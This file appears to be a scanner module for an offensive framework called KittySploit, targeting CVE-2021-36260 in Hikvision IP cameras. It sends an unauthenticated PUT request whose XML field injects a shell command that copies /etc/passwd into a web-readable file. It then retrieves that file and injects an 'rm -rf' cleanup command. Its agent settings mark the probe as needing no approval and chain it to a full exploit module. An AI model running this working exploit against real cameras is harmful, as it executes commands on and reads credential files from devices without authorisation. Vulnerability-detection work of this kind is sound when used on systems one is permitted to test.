#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Hikvision IP camera command injection via /SDK/webLanguage (CVE-2021-36260)."""

import re
import secrets

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Hikvision IP Camera - webLanguage RCE Detection (CVE-2021-36260)',
        'description': (
            'Hikvision IP cameras accept unauthenticated PUT /SDK/webLanguage with a '
            'command injection in the <language> XML field, writing output under webLib '
            '(CVE-2021-36260 / HSRC-202109-01, CISA KEV).'
        ),
        'author': ['KittySploit Team'],
        'severity': 'critical',
        'tags': [
            'web', 'scanner', 'cve', 'cve2021', 'hikvision', 'camera', 'iot', 'rce',
            'cmdi', 'unauth', 'kev', 'vuln',
        ],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 3,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.5,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0, 'min_params': 0,
                'tech_hints_any': [], 'tech_hints_all': [],
                'specializations_any': [], 'risk_signals_any': [],
                'auth_session': False, 'capabilities_any': [], 'capabilities_all': [],
                'confidence_min': {}, 'confidence_min_any': {},
                'endpoint_pattern_any': [], 'param_any': [], 'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [{'capability': 'risk_signal', 'from_detail': ''}],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['exploits/linux/http/hikvision_cve_2021_36260_rce'],
            },
        },
        'references': [
            'https://www.hikvision.com/en/support/cybersecurity/security-advisory/security-notification-command-injection-vulnerability-in-some-hikvision-products/',
            'https://nvd.nist.gov/vuln/detail/CVE-2021-36260',
        ],
        'cve': 'CVE-2021-36260',
    }

    def run(self):
        name = secrets.token_hex(6)
        payload = (
            '<?xml version="1.0" encoding="UTF-8"?>'
            f'<language>$(cat /etc/passwd>webLib/{name})</language>'
        )
        headers = {
            'X-Requested-With': 'XMLHttpRequest',
            'Content-Type': 'application/x-www-form-urlencoded',
        }
        put = self.http_request(
            method='PUT',
            path='/SDK/webLanguage',
            data=payload,
            headers=headers,
            allow_redirects=False,
        )
        if put and put.status_code == 401:
            return False

        get = self.http_request(
            method='GET',
            path=f'/{name}',
            headers=headers,
            allow_redirects=False,
        )
        # Cleanup best-effort
        self.http_request(
            method='PUT',
            path='/SDK/webLanguage',
            data=(
                '<?xml version="1.0" encoding="UTF-8"?>'
                f'<language>$(rm -rf webLib/{name}>webLib/{name})</language>'
            ),
            headers=headers,
            allow_redirects=False,
        )
        if get and get.status_code == 200 and re.search(r'root:.*:0:0:', get.text or ''):
            self.set_info(
                severity='critical',
                reason='Hikvision CVE-2021-36260 command injection confirmed',
                path='/SDK/webLanguage',
            )
            return True
        return False
